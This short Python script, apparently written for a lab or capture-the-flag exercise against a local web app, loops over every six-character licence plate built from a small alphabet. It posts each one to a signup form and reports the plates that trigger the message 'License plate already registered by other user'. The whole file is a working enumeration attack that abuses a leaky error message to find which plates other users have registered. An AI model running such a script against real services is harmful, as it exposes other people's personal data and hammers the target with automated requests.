import requests


url = "http://localhost:3000/signup"
#request = requests.get(url)

valid_plate_symbols = "ABCDE0123456789"

for pos1 in valid_plate_symbols:
    for pos2 in valid_plate_symbols:
        for pos3 in valid_plate_symbols:
            for pos4 in valid_plate_symbols:
                for pos5 in valid_plate_symbols:
                    for pos6 in valid_plate_symbols:
                        plate = pos1 + pos2 + pos3 + pos4 + pos5 + pos6
                        r = requests.post(url,data={'username': 'pyscript','plate':plate,'password':'mal','password2':'mal'})
                        print(f"\r{plate}", end="")
                        if "License plate already registered by other user" in r.text:
                            print(f"Found plate: {plate}")


